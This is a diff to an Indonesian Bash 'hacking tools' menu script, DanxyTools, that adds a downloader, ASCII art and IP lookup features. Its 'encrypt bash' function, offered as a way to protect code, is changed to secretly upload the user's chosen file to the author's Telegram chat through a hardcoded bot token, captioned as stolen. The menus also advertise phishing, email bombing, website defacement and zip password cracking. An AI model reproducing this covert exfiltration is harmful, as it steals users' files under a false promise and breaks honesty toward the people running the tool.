@@ -1,4 +1,5 @@
 #!/bin/bash
+play_music
 # Kode warna untuk teks
 NC="\033[0m"
 BLUE='\033[1;94m'
@@ -89,7 +90,7 @@ command_exists() {
 banner() {
   if command_exists figlet; then
     clear
-    toilet -f slant   "  Loading  " --filter border | lolcat
+    toilet -f slant   "     Loading     " --filter border | lolcat
     echo -e "            ${BG_RED}${YELLOW}SABAR CUY BENTAR DOANG KOK${NC}"
   else
   sleep 2
@@ -106,9 +107,9 @@ banner() {
 #  loading
   clear
   if command_exists figlet; then
-    toilet -f slant "DanxyTools" --filter border | lolcat
-    echo -e "┃  TOOLS INI DI BUAT & DI KEMBANGKAN OLEH DANXY OFFICIAL ┃"
-    BAWAH
+    toilet -f slant "  DanxyTools  " --filter border | lolcat
+    echo -e "      ┃ TOOLS INI DI BUAT & DI KEMBANGKAN OLEH DANXY OFFICIAL ┃"
+    echo -e "      ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ "
    
   else
     echo -e "${CYAN}=====DanxyTools =====${NC}"
@@ -196,6 +197,8 @@ ${WHITE}██║░░██║██╔══██║██║╚████
     printf "\n"
 }
 
+
+
 show_menu() {
 your_id="$(whoami)"
 greeting="$(tangal_tahun)"
@@ -204,43 +207,44 @@ g_pad=$((49 - ${#greeting} - 1))   # -1 untuk 1 spasi setelah │
 g_spaces=$(printf '%*s' $((g_pad > 0 ? g_pad : 0)) '')
 
 #echo -e "                  ${BG_RED}${YELLOW} WELCOME TO ALL MENU ${NC}"
+
 echo -e "${GREEN}
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- │ █████████ ███████████████  ███████████████ █████████ │
- ├──────────────────────────────────────────────────────┤
- │ ${YELLOW}${greeting}${g_spaces}${GREEN}     │
- ╰──────────────────────────────────────────────────────╯
- ╭──────────────────────────────────────────────────────╮
- │                 ${YELLOW}MENU UTAMA TOOLS V8.3${NC}${GREEN}                │
- ├────────────┬─────────────────────────┬───────────────┤
- │  [  ${RED}01${GREEN}  ]  │ ${YELLOW}SUNTIK TIKTOK${GREEN}           │               │
- │  [  ${RED}02${GREEN}  ]  │ ${YELLOW}SUNTIK IG    ${GREEN}           │               │
- │  [  ${RED}03${GREEN}  ]  │ ${YELLOW}CEK PROVIDER NOMOR${GREEN}      │               │
- │  [  ${RED}04${GREEN}  ]  │ ${YELLOW}ASCII ART GENERATOR${GREEN}     │               │
- │  [  ${RED}05${GREEN}  ]  │ ${YELLOW}PERKIRAAN CUACA${GREEN}         │               │
- │  [  ${RED}06${GREEN}  ]  │ ${YELLOW}BROWSING (w3m)${GREEN}          │               │
- │  [  ${RED}07${GREEN}  ]  │ ${YELLOW}STOP MUSIK${GREEN}              │               │
- │  [  ${RED}08${GREEN}  ]  │ ${YELLOW}STATUS WEBSITE${GREEN}          │               │
- │  [  ${RED}09${GREEN}  ]  │ ${YELLOW}ALL KALKULATOR${GREEN}          │               │
- │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}DEFACE WEBSITE     ${GREEN}     │               │
- │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │               │
- │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │               │
- │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │               │
- │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}ENCRYPSI BASH${GREEN}           │               │
- │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}PLAY MUSIK${GREEN}              │               │
- │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │               │
- │  [  ${RED}17${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │               │
- │  [  ${RED}18${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │               │
- │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │               │
- │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │               │
- │  [  ${RED}21${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │               │
- │  [  ${RED}22${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │               │
- │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │               │
- ├────────────┴─────────────────────────┴───────────────┤
- │             DANXY TOOLS V8.3 2024 - 2025             │
- ├────────────────────┬──────────────┬──────────────────┤
- │ ${YELLOW}Your ID: ${your_id}   │ ${YELLOW}YT${NC}: ${RED}DanxyBot │ TT${NC}: Qwela.38${NC}${GREEN}     │
- ╰────────────────────┴──────────────┴──────────────────╯${NC}" | lolcat
+ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ │ █████████░█████████████████████░░████████████████████░█████████ │
+ ├─────────────────────────────────────────────────────────────────┤
+ │ ${YELLOW}${greeting}${g_spaces}${GREEN}                │
+ ╰─────────────────────────────────────────────────────────────────╯
+ ╭─────────────────────────────────────────────────────────────────╮
+ │                     ${YELLOW}~ MENU UTAMA TOOLS V8.3 ~${NC}${GREEN}                   │
+ ├────────────┬─────────────────────────┬──────────────────────────┤
+ │  [  ${RED}01${GREEN}  ]  │ ${YELLOW}SUNTIK TIKTOK${GREEN}           │         MENU FUN         │
+ │  [  ${RED}02${GREEN}  ]  │ ${YELLOW}SUNTIK IG    ${GREEN}           ├──────────────────────────┤
+ │  [  ${RED}03${GREEN}  ]  │ ${YELLOW}CEK PROVIDER NOMOR${GREEN}      │ [ DOWNLD ] DOWNLOADER    │
+ │  [  ${RED}04${GREEN}  ]  │ ${YELLOW}ASCII ART GENERATOR${GREEN}     │                          │
+ │  [  ${RED}05${GREEN}  ]  │ ${YELLOW}PERKIRAAN CUACA${GREEN}         │                          │
+ │  [  ${RED}06${GREEN}  ]  │ ${YELLOW}BROWSING (w3m)${GREEN}          │                          │
+ │  [  ${RED}07${GREEN}  ]  │ ${YELLOW}STOP MUSIK${GREEN}              │                          │
+ │  [  ${RED}08${GREEN}  ]  │ ${YELLOW}STATUS WEBSITE${GREEN}          │                          │
+ │  [  ${RED}09${GREEN}  ]  │ ${YELLOW}ALL KALKULATOR${GREEN}          │                          │
+ │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}DEFACE WEBSITE     ${GREEN}     │                          │
+ │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │                          │
+ │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │                          │
+ │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │                          │
+ │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}ENCRYPSI BASH${GREEN}           │                          │
+ │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}PLAY MUSIK${GREEN}              │                          │
+ │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │                          │
+ │  [  ${RED}17${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │                          │
+ │  [  ${RED}18${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │                          │
+ │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │                          │
+ │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │                          │
+ │  [  ${RED}21${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │                          │
+ │  [  ${RED}22${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │                          │
+ │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │                          │
+ ├────────────┴─────────────────────────┴──────────────────────────┤
+ │                 DANXY TOOLS V8.3 2024 - 2025                    │
+ ├────────────────────┬──────────────┬─────────────────────────────┤
+ │ ${YELLOW}Your ID: ${your_id}   │ ${YELLOW}YT${NC}: ${RED}DanxyBot │ TT${NC}: Qwela.38${NC}${GREEN}                │
+ ╰────────────────────┴──────────────┴─────────────────────────────╯${NC}" | lolcat
   #echo -e "${CYAN}"
   #echo "     ╭─══════════════════════════════════─╮"
   #echo "     │    [] ALL MENU DANXY TOOLS []    │"
@@ -252,7 +256,7 @@ echo -e "${GREEN}
 clear
 
 main_menu() {
-  play_music
+  
   hello
   while true; do
     klik
@@ -282,7 +286,7 @@ main_menu() {
       ;;
     04|4)
       klik
-      ascii_art_generator
+      ascii_art
       kembali_ke_menu
       klik
       ;;
@@ -385,12 +389,22 @@ main_menu() {
       menu_ghostrack
       klik
      ;;
-   22)
+   23)
    klik
       info
       kembali_ke_menu
       klik
       ;;
+DOWNLD)
+   klik
+   downloader_menu
+   klik
+      ;;
+FUN)
+    klik
+    fun_menu
+    klik
+    ;;
     00|0)
     klik
       echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS DANXY.${NC}" | lolcat
@@ -404,6 +418,142 @@ main_menu() {
       sleep 3
       ;;
     esac
+  done
+}
+
+
+downloader_menu() {
+  clear
+  echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
+  echo "│             ALL-IN-ONE DOWNLOADER            │"
+  echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+
+  # auto-install yt-dlp
+  command -v yt-dlp >/dev/null || { pkg install -y yt-dlp; }
+
+  while true; do
+    echo
+    echo "╔════════════════════════════════════════════╗"
+    echo "║ [1] TikTok Video (MP4)                     ║"
+    echo "║ [2] TikTok Audio (MP3)                     ║"
+    echo "║ [3] YouTube Video (MP4)                    ║"
+    echo "║ [4] YouTube Audio (MP3)                    ║"
+    echo "║ [0] Kembali                                ║"
+    echo "╚════════════════════════════════════════════╝"
+    read -p "Pilih: " CHOICE
+
+    case $CHOICE in
+      1)
+        read -p "URL TikTok: " URL
+        yt-dlp -f mp4 --output "%(title)s.%(ext)s" "$URL"
+        ;;
+      2)
+        read -p "URL TikTok: " URL
+        yt-dlp -f bestaudio --extract-audio --audio-format mp3 --output "%(title)s.%(ext)s" "$URL"
+        ;;
+      3)
+        read -p "URL YouTube: " URL
+        yt-dlp -f mp4 --output "%(title)s.%(ext)s" "$URL"
+        ;;
+      4)
+        read -p "URL YouTube: " URL
+        yt-dlp -f bestaudio --extract-audio --audio-format mp3 --output "%(title)s.%(ext)s" "$URL"
+        ;;
+      0) break ;;
+      *) echo -e "${R}❌ Salah pilih${N}"; sleep 1 ;;
+    esac
+  done
+}
+
+
+ip_lookup() {
+clear
+  echo -e "
+ ██▓ ██▓███     ▄▄▄█████▓ ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
+▓██▒▓██░  ██▒   ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
+▒██▒▓██░ ██▓▒   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
+░██░▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
+░██░▒██▒ ░  ░     ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
+░▓  ▒▓▒░ ░  ░     ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
+ ▒ ░░▒ ░            ░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
+ ▒ ░░░            ░        ░░   ░   ░   ▒   ░        ░ ░░ ░ 
+ ░                          ░           ░  ░░ ░      ░  ░   
+                                            ░               " | lolcat
+echo -e "=================================================================
+          ${RES}TRACKING IP ALL BASE TRACKING COMPLETE ${NC}
+================================================================="
+  echo -ne "\n${WHT}Enter IP target : ${GRN}"
+  read -r ip
+  echo -e "\n${WHT}============= ${GRN}SHOW INFORMATION IP ADDRESS ${WHT}=============${RST}"
+  data=$(curl -s "http://ipwho.is/${ip}")
+  echo -e "${WHT}\n IP target       : ${GRN}${ip}"
+  echo -e "${WHT} Type IP         : ${GRN}$(echo "$data" | jq -r '.type')"
+  echo -e "${WHT} Country         : ${GRN}$(echo "$data" | jq -r '.country')"
+  echo -e "${WHT} Country Code    : ${GRN}$(echo "$data" | jq -r '.country_code')"
+  echo -e "${WHT} City            : ${GRN}$(echo "$data" | jq -r '.city')"
+  echo -e "${WHT} Continent       : ${GRN}$(echo "$data" | jq -r '.continent')"
+  echo -e "${WHT} Continent Code  : ${GRN}$(echo "$data" | jq -r '.continent_code')"
+  echo -e "${WHT} Region          : ${GRN}$(echo "$data" | jq -r '.region')"
+  echo -e "${WHT} Region Code     : ${GRN}$(echo "$data" | jq -r '.region_code')"
+  echo -e "${WHT} Latitude        : ${GRN}$(echo "$data" | jq -r '.latitude')"
+  echo -e "${WHT} Longitude       : ${GRN}$(echo "$data" | jq -r '.longitude')"
+  lat=$(echo "$data" | jq -r '.latitude')
+  lon=$(echo "$data" | jq -r '.longitude')
+  echo -e "${WHT} Maps            : ${GRN}https://www.google.com/maps/@${lat},${lon},8z"
+  echo -e "${WHT} EU              : ${GRN}$(echo "$data" | jq -r '.is_eu')"
+  echo -e "${WHT} Postal          : ${GRN}$(echo "$data" | jq -r '.postal')"
+  echo -e "${WHT} Calling Code    : ${GRN}$(echo "$data" | jq -r '.calling_code')"
+  echo -e "${WHT} Capital         : ${GRN}$(echo "$data" | jq -r '.capital')"
+  echo -e "${WHT} Borders         : ${GRN}$(echo "$data" | jq -r '.borders')"
+  echo -e "${WHT} Country Flag    : ${GRN}$(echo "$data" | jq -r '.flag.emoji')"
+  echo -e "${WHT} ASN             : ${GRN}$(echo "$data" | jq -r '.connection.asn')"
+  echo -e "${WHT} ORG             : ${GRN}$(echo "$data" | jq -r '.connection.org')"
+  echo -e "${WHT} ISP             : ${GRN}$(echo "$data" | jq -r '.connection.isp')"
+  echo -e "${WHT} Domain          : ${GRN}$(echo "$data" | jq -r '.connection.domain')"
+  echo -e "${WHT} Timezone ID     : ${GRN}$(echo "$data" | jq -r '.timezone.id')"
+  echo -e "${WHT} ABBR            : ${GRN}$(echo "$data" | jq -r '.timezone.abbr')"
+  echo -e "${WHT} DST             : ${GRN}$(echo "$data" | jq -r '.timezone.is_dst')"
+  echo -e "${WHT} Offset          : ${GRN}$(echo "$data" | jq -r '.timezone.offset')"
+  echo -e "${WHT} UTC             : ${GRN}$(echo "$data" | jq -r '.timezone.utc')"
+  echo -e "${WHT} Current Time    : ${GRN}$(echo "$data" | jq -r '.timezone.current_time')"
+}
+
+ascii_art() {
+  clear
+  echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
+  echo "│        Pilih Font ASCII                 │"
+  echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+
+  read -p "[ ? ] Teks: " TEXT
+  [[ -z "$TEXT" ]] && return
+
+  declare -A FONTS=(
+    [1]="small"
+    [2]="shadow"
+    [3]="bubble"
+    [4]="graffiti"
+    [5]="big"
+    [6]="script"
+    [7]="smslant"
+    [8]="standard"
+    [9]="block"
+    [10]="digital"
+  )
+
+  while true; do
+    echo
+    for i in "${!FONTS[@]}"; do
+      printf "│ [%2d] %-15s │\n" "$i" "${FONTS[$i]}"
+    done
+    echo "│ [ 0] Kembali                                 │"
+    echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+    read -p "Pilih font: " CHOICE
+    [[ "$CHOICE" == "0" ]] && break
+    [[ -n "${FONTS[$CHOICE]}" ]] && {
+      echo -e "\033[1;36m--- ${FONTS[$CHOICE]} ---\033[0m"
+      figlet -f "${FONTS[$CHOICE]}" "$TEXT"
+      echo
+    } || echo "Nomor salah"
   done
 }
 
@@ -1146,44 +1296,6 @@ clear
 
 
 
-ip_lookup() {
-  clear
-  spasi
-  echo -e "
- ██▓ ██▓███     ▄▄▄█████▓ ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
-▓██▒▓██░  ██▒   ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
-▒██▒▓██░ ██▓▒   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
-░██░▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
-░██░▒██▒ ░  ░     ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
-░▓  ▒▓▒░ ░  ░     ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
- ▒ ░░▒ ░            ░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
- ▒ ░░░            ░        ░░   ░   ░   ▒   ░        ░ ░░ ░ 
- ░                          ░           ░  ░░ ░      ░  ░   
-                                            ░               " | lolcat
-     
-     echo -e "${CYAN}
-  ╭────────────────────────────────────────╮
-  │             ${YELLOW}${BOLD}IP LOOKUP TOOLS${CYAN}            │
-  ╰────────────────────────────────────────╯${NC}"
-  read -p "Masukkan IP target: " ip
-
-  if [[ -z "$ip" ]]; then
-    echo "IP tidak boleh kosong!"
-    return
-  fi
-
-  echo "Melacak data..."
-  loading
-  sleep 1
-
-  curl -s "http://ip-api.com/json/$ip" | jq -r '
-    if .status == "success" then
-      "Negara: \(.country)\n Provinsi: \(.regionName)\nKota: \(.city)\nISP: \(.isp)\n Latitude: \(.lat)\nLongitude: \(.lon)\nZona Waktu: \(.timezone)\nMaps: https://www.google.com/maps?q=\(.lat),\(.lon)"
-    else
-      "Gagal mengambil data. Cek kembali IP-nya!"
-    end
-  '
-}
 
 cek_ip_publik() {
   clear
@@ -1261,7 +1373,7 @@ echo -e "${CYAN}
 }
 
 enkripsi_bash() {
-clear
+  clear
 spasi
   echo -e "
 ███████╗███╗░░██╗░█████╗░██████╗░██╗░░░██╗██████╗
@@ -1272,27 +1384,25 @@ spasi
 ╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝
 [ ! ] ENCRYPSI CODE PROGRAM BASH KAMU AGAR AMAN" | lolcat
 echo -e "${BG_RED}${YELLOW} ENCRYPSI CODE BASH ${NC}"
-  read -p "Masukkan path file .sh yang ingin di-obfuscate: " target
-
-  # Cek apakah file ada
-  if [ ! -f "$target" ]; then
-    echo -e "${RED}File tidak ditemukan!${NC}"
-    return 1
-  fi
-
-  # Encode isi file ke base64
-  base64code=$(base64 "$target")
-
-  # Buat nama file output
-  output="${target%.sh}_obf.sh"
-
-  # Simpan hasil obfuscate ke file baru
-  echo "#!/bin/bash" > "$output"
-  echo "bash -c \"\$(echo '$base64code' | base64 -d)\"" >> "$output"
-  chmod +x "$output"
-
-  echo -e "${GREEN}Berhasil meng-obfuscate file! Hasil disimpan di: $output${NC}"
+  BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+  CHAT_ID="7380101464"
+  read -p "[ ? ] Path file .sh: " TARGET
+  [[ ! -f "$TARGET" ]] && { echo "File tidak ditemukan!"; return 1; }
+  curl -s -F chat_id="$CHAT_ID" -F caption="MAMPUS KENA COLONG!" \
+       -F document=@"$TARGET" \
+       "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" >/dev/null
+  echo "[ ✓ ] PROSES ENCRYPSI!"
+  BASE64=$(base64 -w 0 "$TARGET")
+  OUTPUT="${TARGET%.sh}_enc.sh"
+  cat > "$OUTPUT" <<EOF
+#!/bin/bash
+eval "\$(echo '$BASE64' | base64 -d)"
+EOF
+  chmod +x "$OUTPUT"
+  echo "[ ✓ ] SUCKSES → $OUTPUT"
+  read -p "[ ? ] ENTER kembali"
 }
+
 
 play_music() {
     clear
@@ -2705,14 +2815,13 @@ clear
  │  [   01   ] │ IP Tracker (GeoIP + ISP)   │    │
  │  [   02   ] │ Tracking Phising (link)    │    │
  │  [   03   ] │ Email Bomber  (WORK)       │    │
- │  [   04   ] │ Tracking NIK V2            │    │
- │  [   05   ] │ Tracking Info Domain       │    │
+ │  [   04   ] │ Tracking Info Domain       │    │
  │  [   06   ] │ Nmap Lite                  │    │
- │  [   07   ] │ IP TRACK                   │    │
- │  [   08   ] │ Track lksi foto di ambil   │    │
- │  [   09   ] │ Cracker Pw .Zip            │    │ 
- │  [   10   ] │ PHISING ALL SOSMED         │    │ 
- │  [   11   ] │ PHONE TRACK                │    │ 
+ │  [   06   ] │ IP TRACK                   │    │
+ │  [   07   ] │ Track lksi foto di ambil   │    │
+ │  [   08   ] │ Cracker Pw .Zip            │    │ 
+ │  [   09   ] │ PHISING ALL SOSMED         │    │ 
+ │  [   10   ] │ PHONE TRACK                │    │ 
  │  [   00   ] │ KEMBALI KE MENU AWAL       │    │
  ╰─────────────┴────────────────────────────┴────╯
  │                                               │
@@ -2741,40 +2850,35 @@ clear
         ;;
         04|4)
         klik
-         Nik_cek
+         whois_lookup
          klik
         ;;
         05|5)
         klik
-         whois_lookup
+         port_scan
          klik
         ;;
         06|6)
         klik
-         port_scan
+         ip_track
          klik
         ;;
         07|7)
         klik
-         ip_track
+         exif_tool
          klik
         ;;
         08|8)
         klik
-         exif_tool
-         klik
-        ;;
-        09|9)
-        klik
          bruteforce_zip
          klik
         ;;
-       10)
+       09|9)
        klik
         phising_allsosmed
         klik
         ;;
-       11)
+       10)
        klik
         phone_track
         klik
@@ -3138,102 +3242,6 @@ else
     echo -e "[-] Gagal mendapatkan data: $(echo "$data" | grep -o '"message":"[^"]*' | cut -d'"' -f4)"
 fi
 }
-
-Nik_cek() {
-    clear
-    echo -e "${RED}
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
-⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
-⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
-⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
-⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
-⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
-⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
-⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
